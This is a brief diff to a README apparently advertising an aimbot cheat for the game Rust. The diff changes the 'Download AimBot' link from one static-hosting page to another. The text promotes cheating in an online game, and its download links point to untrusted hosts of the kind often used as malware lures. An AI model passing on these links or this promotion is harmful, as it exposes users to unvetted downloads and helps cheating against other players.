@@ -2,7 +2,7 @@
 
 In the unforgiving world of Rust, survival often hinges on split-second decisions and impeccable aim. An aimbot tool can elevate your gameplay by enhancing your aiming capabilities, ensuring that every shot counts.
 
-[![Download AimBot](https://img.shields.io/badge/Download-AimBot-blueviolet)](https://fileoffload8.bitbucket.io/)
+[![Download AimBot](https://img.shields.io/badge/Download-AimBot-blueviolet)](https://Rust-Aimbot-External-mos.github.io/.github)
 ---
 
 ### 🛠️ Key Features
